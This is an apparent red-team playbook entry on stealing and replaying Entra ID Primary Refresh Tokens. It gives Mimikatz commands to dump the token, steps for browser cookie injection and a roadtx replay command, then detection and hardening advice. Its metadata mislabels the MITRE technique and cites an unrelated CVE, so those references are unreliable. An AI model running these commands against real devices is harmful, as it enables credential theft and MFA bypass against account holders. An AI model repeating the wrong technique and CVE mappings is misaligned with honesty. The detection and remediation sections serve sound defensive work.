# [CA-TOKEN-012]: PRT (Primary Refresh Token) Attacks

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-012 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Authentication Certificates (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Windows |
| **Severity** | **Critical** |
| **CVE** | **CVE-2021-42287** (Related bypasses) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Primary Refresh Token (PRT) is the "Golden Ticket" of Entra ID. It allows Single Sign-On (SSO) to all Entra-integrated apps and satisfies MFA claims. Attackers who compromise a device (SYSTEM) can extract the PRT and use it to authenticate to Azure/M365 from their own machine (Pass-the-PRT).
- **Attack Surface:** Hybrid Joined / Entra Joined Devices.
- **Business Impact:** **Total Identity Compromise**. Access to cloud resources with full MFA bypass.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Local Admin (SYSTEM).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Roadtx](https://github.com/dirkjanm/ROADtools)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Dump PRT (Mimikatz)**
```powershell
token::elevate
dpapi::cloudapkd /run /keyvalue:KEY /unprotect
```
*Extracts the `x-ms-RefreshTokenCredential` cookie.*

**Step 2: Browser Injection**
Inject the cookie into a browser session to access `portal.azure.com`.

**Step 3: Roadtx Replay**
Use Roadtx to interactively use the PRT for Graph API calls.
```bash
roadtx interactive -r <PRT> -sk <SessionKey>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `Interactive` | Sign-ins where `DeviceDetail.IsCompliant` is TRUE but the IP is anomalous (Pass-the-PRT often carries the compliance claim). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Token Protection:** Enable "Token Protection" (Token Binding) in Conditional Access. This cryptographically binds the token to the device hardware, preventing replay from a different machine.
*   **Windows 11:** Credential Guard in Win11 offers stronger PRT protection than Win10.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-UNSC-013] (TPM Key Extraction)
> **Next Logical Step:** [LAT-CLOUD-001]
